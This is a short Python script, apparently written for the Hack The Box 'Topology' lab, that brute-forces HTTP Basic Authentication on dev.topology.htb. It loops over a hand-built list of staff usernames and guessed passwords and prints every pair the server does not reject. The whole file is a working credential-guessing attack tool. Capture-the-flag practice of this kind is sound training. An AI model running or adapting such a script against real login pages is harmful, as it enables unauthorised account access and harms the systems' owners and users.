#!/usr/bin/python3

import sys
import requests
from requests.auth import HTTPBasicAuth
from pwn import *

def perform_auth(user: str, password: str) -> None:
    auth = HTTPBasicAuth(user, password)
    ress = requests.get(url="http://dev.topology.htb/", auth=auth)

    if ress.status_code != 401:
        print(user, password)


def main():
    try:
        # possible combinations
        p = log.progress("Attepting brute force")
        users = [
            "lilian",
            "vajramani",
            "derek",
            "lklein",
            "l.klein",
            "lklein@topology.htb",
            "vdaisley",
            "vdaisley@topology.htb",
            "dabrahams",
            "dabrahams@topology.htb"
        ]

        passwords = ["lklein",
                     "l.klein",
                     "klein",
                     "daisley",
                     "abrahams",
                     "lklein123",
                     "vdaisley",
                     "vdaisley123",
                     "dabrahams",
                     "dabrahams123"]


        for user in users:
            for password in passwords:
                p.status(f"  user {user} and password {password}")
                perform_auth(user, password)

    except Exception as e:
        print(str(e))
        sys.exit(1)

    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit(0)


if __name__ == "__main__":
    main()
